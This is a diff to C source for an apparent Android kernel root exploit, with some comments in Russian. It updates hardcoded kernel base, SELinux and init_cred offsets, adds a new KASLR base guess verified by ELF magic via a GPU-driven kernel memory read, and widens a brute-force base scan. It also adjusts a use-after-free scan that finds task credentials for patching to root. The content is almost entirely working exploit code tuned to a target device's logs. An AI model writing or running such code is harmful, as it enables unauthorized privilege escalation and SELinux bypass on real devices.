@@ -24,7 +24,7 @@
 
 // ==================== РЕАЛЬНЫЕ СМЕЩЕНИЯ ДЛЯ ВАШЕГО ЯДРА ====================
 // Updated with Batch Spray and Fast Scan optimizations
-#define KERNEL_BASE          0xffffffaf20000000ULL
+#define KERNEL_BASE          0xffffffa000000000ULL
 #define SELINUX_OFFSET       0x02f74ce8ULL
 #define INIT_CRED_OFFSET     0x018f9038ULL
 
@@ -1268,19 +1268,27 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
     // 1. Resolve Kernel Base - Prioritize verified KERNEL_BASE
     if (kernel_base == 0) {
         uint8_t elf_magic[4];
-        // Try 'af' prefix first (your new case)
-        uint64_t base_af = 0xffffffaf20000000ULL;
-        if (gpu_read_task_struct(fd, base_af, elf_magic, 4) == 0 && 
+        // Try 'a' prefix (observed in latest log)
+        uint64_t base_a = 0xffffffa000000000ULL;
+        if (gpu_read_task_struct(fd, base_a, elf_magic, 4) == 0 && 
             elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
-            kernel_base = base_af;
-            fprintf(stderr, "[PARENT] Verified KERNEL_BASE (af-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
+            kernel_base = base_a;
+            fprintf(stderr, "[PARENT] Verified KERNEL_BASE (a-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
         } else {
-            // Try 'b' prefix
-            uint64_t base_b = 0xffffffb000000000ULL;
-            if (gpu_read_task_struct(fd, base_b, elf_magic, 4) == 0 && 
+            // Try 'af' prefix
+            uint64_t base_af = 0xffffffaf20000000ULL;
+            if (gpu_read_task_struct(fd, base_af, elf_magic, 4) == 0 && 
                 elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
-                kernel_base = base_b;
-                fprintf(stderr, "[PARENT] Verified KERNEL_BASE (b-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
+                kernel_base = base_af;
+                fprintf(stderr, "[PARENT] Verified KERNEL_BASE (af-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
+            } else {
+                // Try 'b' prefix
+                uint64_t base_b = 0xffffffb000000000ULL;
+                if (gpu_read_task_struct(fd, base_b, elf_magic, 4) == 0 && 
+                    elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
+                    kernel_base = base_b;
+                    fprintf(stderr, "[PARENT] Verified KERNEL_BASE (b-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
+                }
             }
         }
         
@@ -1612,7 +1620,8 @@ static uint64_t find_kernel_base_auto(void)
     }
 
     uint64_t standard_bases[] = {
-        0xffffffaf20000000ULL, // Observed in your logs
+        0xffffffa000000000ULL, // Observed in your latest logs (a3...)
+        0xffffffaf20000000ULL, 
         0xffffffaf00000000ULL,
         0xffffffb000000000ULL,
         0xffffffc000000000ULL,
@@ -1621,7 +1630,6 @@ static uint64_t find_kernel_base_auto(void)
         0xffffff9550000000ULL, 
         0xffffff94d0000000ULL, 
         0xffffff8e70000000ULL, 
-        0xffffffc020000000ULL,
     };
 
     for (int i = 0; i < 10; i++)
@@ -1636,9 +1644,9 @@ static uint64_t find_kernel_base_auto(void)
         }
     }
 
-    // Aggressive scan in the af and b ranges
+    // Aggressive scan in a wide range for Android 13 KASLR
     fprintf(stderr, "[KBASE] Starting aggressive range scan for ELF magic...\n");
-    for (uint64_t test = 0xffffffa000000000ULL; test < 0xffffffd000000000ULL; test += 0x200000ULL) {
+    for (uint64_t test = 0xffffff8000000000ULL; test < 0xffffffdf00000000ULL; test += 0x200000ULL) {
         uint8_t elf_magic[4];
         if (gpu_read_task_struct(fd, test, elf_magic, 4) == 0) {
             if (elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
@@ -1892,7 +1900,7 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                     fprintf(stderr, "    [+++] DYNAMIC CRED FOUND: 0x%lx (Real: 0x%lx)\n", (unsigned long)found_cred_ptr, (unsigned long)found_real_cred_ptr);
                 } else {
                     // Fallback to static offset
-                    fprintf(stderr, "    [*] Dynamic scan failed. Using verified task_struct offsets (cred at 0x%x)...\n", OFFSET_CRED);
+                    fprintf(stderr, "    [*] Dynamic scan failed. Using verified task_struct offsets (cred at 0x%x, real_cred at 0x%x)...\n", OFFSET_CRED, OFFSET_REAL_CRED);
                     gpu_read_task_struct(fd, task_start_va + OFFSET_CRED, (uint8_t *)&found_cred_ptr, 8);
                     gpu_read_task_struct(fd, task_start_va + OFFSET_REAL_CRED, (uint8_t *)&found_real_cred_ptr, 8);
                 }
